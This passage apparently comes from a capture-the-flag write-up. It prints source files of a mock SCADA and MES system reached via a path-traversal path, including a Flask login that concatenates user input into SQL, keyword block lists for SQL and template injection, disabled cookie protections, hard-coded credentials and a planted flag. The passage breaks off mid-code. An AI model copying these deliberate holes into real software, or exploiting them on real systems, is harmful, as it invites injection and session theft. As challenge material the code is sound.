punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>query<span class="token punctuation">,</span> params<span class="token punctuation">)</span>        result <span class="token operator">=</span> self<span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">update_record</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> query<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>query<span class="token punctuation">,</span> params<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>lastrowid<span class="token triple-quoted-string string">""" 使用with语句进行数据库操作with MySQLDatabase(host='localhost', user='yourusername', password='yourpassword', database='mydatabase') as db:    result = db.execute_query("SELECT * FROM customers")    for x in result:        print(x)    updated_rows = db.update_record("UPDATE customers SET address = 'Canyon 123' WHERE address = 'Valley 345'")    print(updated_rows, "记录被修改")"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>..&#x2F;base_info.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""sis监控文件统一放到  /home/opt/monitor目录下mis前端文件统一放到  /var/www/html 并指定默认访问页面为index.php"""</span><span class="token comment"># mysql</span>host <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>user <span class="token operator">=</span> <span class="token string">"root"</span>pw <span class="token operator">=</span> <span class="token string">"abc123!@#"</span>database <span class="token operator">=</span> <span class="token string">"mesdb"</span><span class="token comment"># 组态系统信息</span>ip <span class="token operator">=</span> <span class="token string">'192.168.2.32'</span>port <span class="token operator">=</span> <span class="token number">4862</span><span class="token comment"># 监控节点数据</span>sub_ids <span class="token operator">=</span> <span class="token punctuation">(</span>    <span class="token string">'ns=1;s=t|DLSSL'</span><span class="token punctuation">,</span>  <span class="token comment"># 打螺丝数量</span>    <span class="token string">'ns=1;s=t|FTQS'</span><span class="token punctuation">,</span>  <span class="token comment"># 发条圈数</span>    <span class="token string">'ns=1;s=t|FZJD'</span><span class="token punctuation">,</span>  <span class="token comment"># 翻转角度</span>    <span class="token string">'ns=1;s=t|FZZP_Run'</span><span class="token punctuation">,</span>  <span class="token comment"># 翻转装配运行</span>    <span class="token comment"># 'ns=1;s=t|FZZP_Start',  # 翻转装配启动</span>    <span class="token comment"># 'ns=1;s=t|FZZP_Stop',  # 翻转装配停止</span>    <span class="token comment"># 'ns=1;s=t|hand',  # 手自动模式</span>    <span class="token string">'ns=1;s=t|HJ_SD'</span><span class="token punctuation">,</span>  <span class="token comment"># 环境湿度</span>    <span class="token string">'ns=1;s=t|HJ_WD'</span><span class="token punctuation">,</span>  <span class="token comment"># 环境温度</span>    <span class="token string">'ns=1;s=t|JGDB_Run'</span><span class="token punctuation">,</span>  <span class="token comment"># 激光打标运行</span>    <span class="token comment"># 'ns=1;s=t|JGDB_Start',  # 激光打标启动</span>    <span class="token comment"># 'ns=1;s=t|JGDB_Stop',  # 激光打标停止</span>    <span class="token string">'ns=1;s=t|JGPL'</span><span class="token punctuation">,</span>  <span class="token comment"># 激光频率</span>    <span class="token string">'ns=1;s=t|JXSL_Run'</span><span class="token punctuation">,</span>  <span class="token comment"># 机芯上料运行</span>    <span class="token comment"># 'ns=1;s=t|JXSL_Start',  # 机芯上料启动</span>    <span class="token comment"># 'ns=1;s=t|JXSL_Stop',  # 机芯上料停止</span>    <span class="token string">'ns=1;s=t|JZDL_Run'</span><span class="token punctuation">,</span>  <span class="token comment"># 基座打料运行</span>    <span class="token comment"># 'ns=1;s=t|JZDL_Start',  # 基座打料启动</span>    <span class="token comment"># 'ns=1;s=t|JZDL_Stop',  # 基座打料停止</span>    <span class="token string">'ns=1;s=t|SCSL'</span><span class="token punctuation">,</span>  <span class="token comment"># 生产数量</span>    <span class="token string">'ns=1;s=t|SGDLS_Run'</span><span class="token punctuation">,</span>  <span class="token comment"># 上盖打螺丝运行</span>    <span class="token comment"># 'ns=1;s=t|SGDLS_Start',  # 上盖打螺丝启动</span>    <span class="token comment"># 'ns=1;s=t|SGDLS_Stop',  # 上盖打螺丝停止</span>    <span class="token string">'ns=1;s=t|SJSFT_Run'</span><span class="token punctuation">,</span>  <span class="token comment"># 视觉上发条运行</span>    <span class="token comment"># 'ns=1;s=t|SJSFT_Start',  # 视觉上发条启动</span>    <span class="token comment"># 'ns=1;s=t|SJSFT_Stop',  # 视觉上发条停止</span>    <span class="token string">'ns=1;s=t|SLSD'</span><span class="token punctuation">,</span>  <span class="token comment"># 上料速度</span>    <span class="token string">'ns=1;s=t|tongxun_state'</span><span class="token punctuation">,</span>  <span class="token comment"># PLC通讯状态</span>    <span class="token string">'ns=1;s=t|TPZY_Run'</span><span class="token punctuation">,</span>  <span class="token comment"># 托盘转运运行</span>    <span class="token comment"># 'ns=1;s=t|TPZY_Start',  # 托盘转运启动</span>    <span class="token comment"># 'ns=1;s=t|TPZY_Stop',  # 托盘转运停止</span>    <span class="token string">'ns=1;s=t|YJ_Run'</span><span class="token punctuation">,</span>  <span class="token comment"># 一键运行</span>    <span class="token comment"># 'ns=1;s=t|YJ_Start',  # 一键启动</span>    <span class="token comment"># 'ns=1;s=t|YJ_Stop',  # 一键停止</span>    <span class="token string">'ns=1;s=t|ZN_M_OVERSPEED'</span><span class="token punctuation">,</span>  <span class="token comment"># 电机超速报警</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>..&#x2F;update_value.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> os<span class="token keyword">import</span> time<span class="token keyword">import</span> datetime<span class="token keyword">from</span> base_info <span class="token keyword">import</span> sub_ids<span class="token punctuation">,</span> host<span class="token punctuation">,</span> user<span class="token punctuation">,</span> pw<span class="token punctuation">,</span> database<span class="token keyword">from</span> mysql_db <span class="token keyword">import</span> MySQLDatabasenode_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>x<span class="token punctuation">:</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'\|(.*)'</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> sub_ids<span class="token punctuation">&#125;</span>abs_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">monitor_task</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> MySQLDatabase<span class="token punctuation">(</span>host<span class="token punctuation">,</span> user<span class="token punctuation">,</span> pw<span class="token punctuation">,</span> database<span class="token punctuation">)</span> <span class="token keyword">as</span> db<span class="token punctuation">:</span>            result <span class="token operator">=</span> db<span class="token punctuation">.</span>execute_query<span class="token punctuation">(</span>                <span class="token string">"SELECT * FROM monitor WHERE name= %s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>key<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> result<span class="token punctuation">:</span>                db<span class="token punctuation">.</span>update_record<span class="token punctuation">(</span>                    <span class="token string">"UPDATE monitor SET content=%s WHERE name = %s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                db<span class="token punctuation">.</span>update_record<span class="token punctuation">(</span>                    <span class="token string">"INSERT INTO monitor (name, name_key, content) VALUES (%s, %s, %s)"</span><span class="token punctuation">,</span>                    <span class="token punctuation">(</span>key<span class="token punctuation">,</span> node_dict<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f">>>>> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>node_dict<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> 记录被修改 >>>>>"</span></span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"monitor_task_error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">finally</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"monitor_task_use_time: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>..&#x2F;get_generate_plan.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token punctuation">,</span> timedeltaNUM_PLANS <span class="token operator">=</span> <span class="token number">20</span>MIN_PLAN_QUANTITY <span class="token operator">=</span> <span class="token number">10</span>MAX_PLAN_QUANTITY <span class="token operator">=</span> <span class="token number">100</span>MIN_PLAN_DURATION <span class="token operator">=</span> <span class="token number">1</span>MAX_PLAN_DURATION <span class="token operator">=</span> <span class="token number">14</span><span class="token keyword">def</span> <span class="token function">generate_plan</span><span class="token punctuation">(</span>start_date<span class="token punctuation">,</span> end_date<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span>    order_number <span class="token operator">=</span> generate_plan_number<span class="token punctuation">(</span>start_date<span class="token punctuation">,</span> i<span class="token punctuation">)</span>    plan_quantity <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>MIN_PLAN_QUANTITY<span class="token punctuation">,</span> MAX_PLAN_QUANTITY<span class="token punctuation">)</span>    plan_start <span class="token operator">=</span> random_date<span class="token punctuation">(</span>start_date<span class="token punctuation">,</span> end_date<span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y-%m-%d"</span><span class="token punctuation">)</span>    plan_duration <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>MIN_PLAN_DURATION<span class="token punctuation">,</span> MAX_PLAN_DURATION<span class="token punctuation">)</span>    plan_end <span class="token operator">=</span> <span class="token punctuation">(</span>start_date <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span>plan_duration<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y-%m-%d"</span><span class="token punctuation">)</span>    order_status <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"正在进行"</span><span class="token punctuation">,</span> <span class="token string">"已完成"</span><span class="token punctuation">,</span> <span class="token string">"取消"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    completion_rate <span class="token operator">=</span> <span class="token builtin">round</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        <span class="token string">"order_number"</span><span class="token punctuation">:</span> order_number<span class="token punctuation">,</span>        <span class="token string">"plan_quantity"</span><span class="token punctuation">:</span> plan_quantity<span class="token punctuation">,</span>        <span class="token string">"plan_start"</span><span class="token punctuation">:</span> plan_start<span class="token punctuation">,</span>        <span class="token string">"plan_end"</span><span class="token punctuation">:</span> plan_end<span class="token punctuation">,</span>        <span class="token string">"order_status"</span><span class="token punctuation">:</span> order_status<span class="token punctuation">,</span>        <span class="token string">"completion_rate"</span><span class="token punctuation">:</span> completion_rate    <span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">generate_plan_number</span><span class="token punctuation">(</span>start_date<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"ORDER-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>start_date<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y%m%d'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token keyword">def</span> <span class="token function">random_date</span><span class="token punctuation">(</span>start_date<span class="token punctuation">,</span> end_date<span class="token punctuation">)</span><span class="token punctuation">:</span>    time_between <span class="token operator">=</span> end_date <span class="token operator">-</span> start_date    random_days <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> time_between<span class="token punctuation">.</span>days<span class="token punctuation">)</span>    <span class="token keyword">return</span> start_date <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span>random_days<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">production_plan</span><span class="token punctuation">(</span>start_date<span class="token punctuation">,</span> end_date<span class="token punctuation">,</span> num_plans<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span>generate_plan<span class="token punctuation">(</span>start_date<span class="token punctuation">,</span> end_date<span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num_plans<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">get_random_plan</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    start_date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>date<span class="token punctuation">(</span><span class="token punctuation">)</span>    end_date <span class="token operator">=</span> start_date <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> production_plan<span class="token punctuation">(</span>start_date<span class="token punctuation">,</span> end_date<span class="token punctuation">,</span> NUM_PLANS<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;scada&#x2F;app.py，是5001端口上的服务</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> session<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span>Markup<span class="token punctuation">,</span>make_response<span class="token punctuation">,</span>flash<span class="token keyword">import</span> random<span class="token keyword">import</span> hashlib<span class="token keyword">from</span> flask_sqlalchemy <span class="token keyword">import</span> SQLAlchemy  <span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>security <span class="token keyword">import</span> generate_password_hash<span class="token punctuation">,</span> check_password_hash  <span class="token keyword">import</span> pymysql<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Template<span class="token comment"># flag&#123;Yes_You_find_Me!&#125;</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'icssla'</span>  <span class="token comment"># 设置一个密钥用于session加密</span><span class="token comment"># 数据库连接配置  </span>db_config <span class="token operator">=</span> <span class="token punctuation">&#123;</span>      <span class="token string">'host'</span><span class="token punctuation">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>      <span class="token string">'user'</span><span class="token punctuation">:</span> <span class="token string">'root'</span><span class="token punctuation">,</span>      <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'abc123!@#'</span><span class="token punctuation">,</span>      <span class="token string">'db'</span><span class="token punctuation">:</span> <span class="token string">'flask_login_db'</span><span class="token punctuation">,</span>      <span class="token string">'charset'</span><span class="token punctuation">:</span> <span class="token string">'utf8mb4'</span><span class="token punctuation">,</span>      <span class="token string">'cursorclass'</span><span class="token punctuation">:</span> pymysql<span class="token punctuation">.</span>cursors<span class="token punctuation">.</span>DictCursor<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span> <span class="token comment"># 设置 session cookie 的 HttpOnly 和 Secure 标志</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SESSION_COOKIE_HTTPONLY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>  <span class="token comment"># 设置为 False，允许 JavaScript 访问</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SESSION_COOKIE_SECURE'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>  <span class="token comment"># 设置为 False，允许在 HTTP 上发送 cookie</span><span class="token keyword">def</span> <span class="token function">contains_sql_keywords</span><span class="token punctuation">(</span>input_string<span class="token punctuation">,</span> keywords<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">for</span> keyword <span class="token keyword">in</span> keywords<span class="token punctuation">:</span>          <span class="token keyword">if</span> keyword <span class="token keyword">in</span> input_string<span class="token punctuation">:</span>              <span class="token keyword">return</span> <span class="token boolean">True</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  <span class="token keyword">def</span> <span class="token function">contains_ssti_keywords</span><span class="token punctuation">(</span>input_string<span class="token punctuation">,</span> keywords<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">for</span> keyword <span class="token keyword">in</span> keywords<span class="token punctuation">:</span>          <span class="token keyword">if</span> keyword <span class="token keyword">in</span> input_string<span class="token punctuation">:</span>              <span class="token keyword">return</span> <span class="token boolean">True</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  <span class="token comment"># 假设这是你的用户数据库</span><span class="token comment">#users = &#123;</span><span class="token comment">#    "admin": "admin@123"</span><span class="token comment">#&#125;</span>md5_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 生成随机风机数据</span><span class="token keyword">def</span> <span class="token function">generate_random_data</span><span class="token punctuation">(</span>page<span class="token punctuation">,</span> num_entries<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num_entries<span class="token punctuation">)</span><span class="token punctuation">:</span>        fan <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"Fan </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        speed <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span>  <span class="token comment"># 转速范围 1000-3000 RPM</span>        power <span class="token operator">=</span> random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">100.0</span><span class="token punctuation">,</span> <span class="token number">500.0</span><span class="token punctuation">)</span>  <span class="token comment"># 发电量范围 100-500 kW</span>        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"fan"</span><span class="token punctuation">:</span> fan<span class="token punctuation">,</span> <span class="token string">"speed"</span><span class="token punctuation">:</span> speed<span class="token punctuation">,</span> <span class="token string">"power"</span><span class="token punctuation">:</span> power<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    page_size <span class="token operator">=</span> <span class="token number">10</span>  <span class="token comment"># 每页显示的数据条数</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        page <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span>        start_index <span class="token operator">=</span> <span class="token punctuation">(</span>page <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> page_size        end_index <span class="token operator">=</span> start_index <span class="token operator">+</span> page_size        <span class="token keyword">return</span> data<span class="token punctuation">[</span>start_index<span class="token punctuation">:</span>end_index<span class="token punctuation">]</span><span class="token punctuation">,</span> page    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span>  <span class="token comment"># 如果输入的不是有效的整数，返回空数据和默认页数1</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'dashboard.html'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        sql_keywords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'select'</span><span class="token punctuation">,</span> <span class="token string">'from'</span><span class="token punctuation">,</span> <span class="token string">'where'</span><span class="token punctuation">,</span> <span class="token string">'union'</span><span class="token punctuation">,</span> <span class="token string">'join'</span><span class="token punctuation">,</span> <span class="token string">'sleep'</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">]</span>          input_string <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>          md5_hash<span class="token punctuation">.</span>update<span class="token punctuation">(</span>input_string<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        hex_dig <span class="token operator">=</span> md5_hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        connection <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token operator">**</span>db_config<span class="token punctuation">)</span>          <span class="token keyword">if</span> contains_sql_keywords<span class="token punctuation">(</span>username<span class="token punctuation">,</span> sql_keywords<span class="token punctuation">)</span><span class="token punctuation">:</span>              <span class="token keyword">return</span> <span class="token string">"Error: There are illegal characters in the character you entered."</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>              <span class="token keyword">with</span> connection<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> cursor<span class="token punctuation">:</span>                  <span class="token comment"># 执行查询  </span>                sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username ='"</span> <span class="token operator">+</span> username <span class="token operator">+</span><span class="token string">"'"</span>                cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>                  <span class="token comment">#sql = "SELECT * FROM users WHERE username = %s"  </span>                <span class="token comment">#cursor.execute(sql, (username,))  </span>                result <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment"># 验证用户名和密码  </span>                <span class="token keyword">if</span> result <span class="token keyword">and</span> result<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">==</span> password<span class="token punctuation">:</span>                       flash<span class="token punctuation">(</span><span class="token string">'Login successful!'</span><span class="token punctuation">,</span> <span class="token string">'success'</span><span class="token punctuation">)</span>                      session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username                      <span class="token comment"># 假设 session_token 是与 session 相关的一个值  </span>                    session_token <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">,</span> <span class="token number">999999</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 仅为示例  </span>                    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                      response<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> hex_dig<span class="token punctuation">,</span> httponly<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> secure<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>                      <span class="token keyword">return</span> response                  <span class="token keyword">else</span><span class="token punctuation">:</span>                      flash<span class="token punctuation">(</span><span class="token string">'Invalid username or 